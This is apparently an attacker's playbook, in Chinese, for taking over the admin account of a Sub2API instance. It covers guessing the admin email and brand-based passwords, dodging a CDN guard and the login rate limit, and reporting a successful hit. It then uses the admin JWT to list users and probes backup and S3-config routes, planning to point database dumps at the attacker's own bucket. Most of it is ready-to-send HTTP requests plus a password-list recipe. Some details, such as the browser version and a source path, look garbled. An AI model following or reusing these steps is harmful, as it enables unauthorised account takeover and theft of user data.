# Sub2API 管理端弱口令 → 管理员 JWT 接管

## 适用/前提
- 目标跑 Sub2API（Wei-Shaw/sub2api，本次为 0.2.19），管理端 API 前缀 `/api/v1/`。
- 登录接口 `/api/v1/auth/login` 接受 `email + password` JSON：
  无验证码、无图形码、默认**未启用 TOTP**（命中时响应不含 `requires_2fa`）。
- 管理员邮箱可猜：默认管理员就是 `admin@<站点主域名>`。
- 口令来自站点品牌派生短词 + 常见数字后缀（本次 `chaofan888`）。

## 关键环境约束（踩过的坑）
| 约束 | 原因 | 处理 |
|---|---|---|
| 必须带浏览器 UA | 前置 CDN 有 `_guard` 校验 | 固定 `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/192.0.2.4 Safari/537.36` |
| **不要**带 `X-Forwarded-For` | 带了会被 CDN 判异常 | 全流程不自定义 XFF 头 |
| 限速按真实出口 IP 计 ≈20 次/分 | 登录接口限流 | 单线程 ≤3.5s/请求慢跑，别并发 |

## 步骤 1：命中（第 25 条口令）
```http
POST /api/v1/auth/login HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36
Content-Type: application/json

{"email":"admin@<domain>","password":"<brand>888"}
```
成功回显：
```http
HTTP/1.1 200 OK
{"code":0,"message":"success","data":{"access_token":"eyJhbGciOiJIUzI1NiIs...","refresh_token":"rt_...","token_type":"Bearer","user":{"id":1,"email":"admin@<domain>","role":"admin"}}}
```
JWT claims 解码后可见 `user_id:1`、`role:"admin"`、`token_version`。

## 步骤 2：证明权限真实
```http
GET /api/v1/admin/users?page=1&page_size=3 HTTP/1.1
Host: <target>
Authorization: Bearer <access_token>
User-Agent: <同上 Chrome UA>
```
→ `200 {"code":0,"data":{"items":[{"id":234,"email":"...","role":"user"}],"total":106,"page":1}}`

## 步骤 3：摸备份/导出面（拿库的另一条路）
```http
GET /api/v1/admin/backups          # 备份列表
GET /api/v1/admin/backups/s3-config # 备份存储配置（endpoint/region/bucket/access_key_id/prefix）
```
路由由源码 `routes/target482.example.com:644` 确认。若 s3-config 全空 → 无现成备份可下，
需把自有 S3 桶填进去再触发 dump，才能把业务库导出成文件。

## 判据
- 命中：HTTP 200 + `code:0` + 有 `data.access_token`，且 claims `role=admin`。
- 失败：401 或 `code!=0`（口令错）。域名错/UA 缺/限速都会伪装成失败，先排环境再加字典。

## 字典建议
password 侧按 `<品牌短词><后缀>` 生成：`888`、`123`、`1234`、`2025`、`2026`、`@2026`、`ab123456`；
email 侧固定 `admin@<域>`，并可加 `root@`、`system@`。总量压在 ~100 条内，按 20/分算约 5 分钟。